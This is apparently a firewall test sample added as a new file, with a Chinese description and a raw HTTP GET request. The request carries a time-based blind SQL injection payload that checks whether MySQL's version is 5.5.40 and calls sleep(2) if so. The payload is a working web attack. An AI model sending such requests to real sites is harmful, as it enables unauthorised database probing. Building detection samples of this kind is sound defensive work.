@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_延时注入-06506260
+# 基于延时注入,将"select  case when (select version()) = '5.5.40' then sleep(2) else 1 end"语句注入到 SQL 查询参数中。攻击者尝试通过子查询来获取数据库的版本号，并与字符串'5.5.40'进行比较。如果匹配，则使用 sleep(2) 函数引入延迟2秒；否则返回1。该SQL注入语句的攻击目的是通过注入恶意代码来检测目标数据库的版本号。如果目标数据库的版本号为'5.5.40'，则引入延迟2秒（使用sleep(2)函数）；否则返回1。攻击者可能利用这个注入点来判断数据库是否存在特定的漏洞或弱点，从而进行后续的攻击。
+GET /?id=1%20and%20select%20%20case%20when%20%28select%20version%28%29%29%20=%20%275.5.40%27%20then%20sleep%282%29%20else%201%20end&bid=hd_tag_m8mv24cg HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24cg
+RM-PRO-Token: cd65e7fc37e39966665e4c86b5c66234
+RM-PRO-Time: 1742808374759
+User-Agent: curl/7.83.1
+
